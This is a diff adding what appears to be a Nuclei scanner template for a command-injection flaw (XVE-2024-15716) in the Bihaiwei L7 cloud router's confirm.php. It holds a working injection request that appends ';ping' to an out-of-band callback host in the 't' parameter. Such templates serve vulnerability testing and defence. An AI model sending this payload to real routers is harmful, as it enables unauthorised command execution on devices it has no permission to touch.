@@ -1,0 +1,21 @@
+http:
+    - matchers:
+        - part: interactsh_protocol
+          type: word
+          words:
+            - dns
+      raw:
+        - |
+          GET /notice/confirm.php?t=;ping%20{{interactsh-url}} HTTP/1.1
+          Host: {{Hostname}}
+id: bihaiweiL7-confirm-RCE
+info:
+    author: Superhero
+    description: |-
+        app="碧海威科技-L7云路由"
+        碧海威L7 confirm.php接口处存在RCE漏洞，恶意攻击者可能利用此漏洞执行恶意命令，获取服务器敏感信息，最终可能导致服务器失陷。
+    name: 碧海威L7云路由无线运营版 confirm.php 命令注入漏洞复现(XVE-2024-15716)
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/140025842
+    severity: high
+    tags: []
